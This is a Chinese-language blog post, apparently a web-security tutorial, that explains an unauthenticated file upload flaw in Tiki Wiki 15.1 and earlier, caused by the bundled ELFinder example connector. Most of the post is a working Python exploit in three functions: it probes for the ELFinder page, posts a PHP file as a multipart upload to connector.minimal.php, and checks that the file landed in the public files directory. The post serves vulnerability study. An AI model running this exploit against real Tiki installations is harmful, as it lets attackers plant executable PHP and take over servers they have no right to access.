      <content type="html"><![CDATA[<h1 id="Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload"><a href="#Tiki-Wiki-lt-15-1-Unauthenticated-File-Upload" class="headerlink" title="Tiki Wiki &lt;=15.1 - Unauthenticated File Upload"></a>Tiki Wiki &lt;=15.1 - Unauthenticated File Upload</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p><strong>利用Tiki利用Tiki Wiki&lt;=15.1中的文件上传漏洞，<br>漏洞来自tiki的第三方组件ELFinder -version 2.0<br>该组件带有一个默认的示例页面：包括上传、删除、重命名、创建目录等<br>并且该页面不强制进行文件扩展名、内容类型等验证。<br>因此，未经身份验证的用户也可以上传PHP文件。</strong></p><h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><h3 id="1-检测漏洞是否存在"><a href="#1-检测漏洞是否存在" class="headerlink" title="1. 检测漏洞是否存在"></a>1. 检测漏洞是否存在</h3><p>使用requests模块，<a href="http://docs.python-requests.org/zh_CN/latest/user/quickstart.html" target="_blank" rel="noopener">http://docs.python-requests.org/zh_CN/latest/user/quickstart.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url, port)</span>:</span></span><br><span class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/elfinder.html'</span>]</span><br><span class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line">    print(target_url)</span><br><span class="line">    r = requests.get(target_url)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">        print(<span class="string">"检测成功,开始攻击"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"未检测到"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure></p><h3 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2. 漏洞利用"></a>2. 漏洞利用</h3><ul><li>选择一个php文件上传然后抓包可得：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170423/104629854.png" alt="mark"></li><li>据此，使用requests库提交Multipart/form-data格式的数据，查看post部分<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/blog/20170423/104720598.png" alt="mark"></li><li><p>据此构造参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</span><br><span class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</span><br><span class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</span><br><span class="line">             &#125;</span><br></pre></td></tr></table></figure></li><li><p>随后使用post方法提交</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(url, port, filename)</span>:</span></span><br><span class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/php/connector.minimal.php'</span>]</span><br><span class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line">    files = &#123;<span class="string">'cmd'</span>: (<span class="keyword">None</span>, <span class="string">'upload'</span>),</span><br><span class="line">             <span class="string">'target'</span>: (<span class="keyword">None</span>, <span class="string">'l1_XA'</span>),</span><br><span class="line">             <span class="string">'upload[]'</span>: (filename, open(filename, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</span><br><span class="line">             &#125;</span><br><span class="line">    r = requests.post(target_url, files=files)</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-检测是否上传成功"><a href="#3-检测是否上传成功" class="headerlink" title="3.检测是否上传成功"></a>3.检测是否上传成功</h3><p>如果上传成功，会在/tiki/vendor_extra/elfinder/files/路径下找到上传的文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_success</span><span class="params">(url, port, filename)</span>:</span></span><br><span class="line">    parts = [<span class="string">'http://'</span>, url, <span class="string">':'</span>, port, <span class="string">'/tiki/vendor_extra/elfinder/files/'</span>, filename]</span><br><span class="line"></span><br><span class="line">    target_url = <span class="string">''</span>.join(<span class="string">'%s'</span> % part <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line">    r = requests.get(target_url)</span><br><span class="line">    <span class="keyword">if</span> (r.status_code == <span class="number">200</span>):</span><br><span class="line">        print(<span class="string">"上传成功~"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"上传失败"</span>)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
  
  
</search>
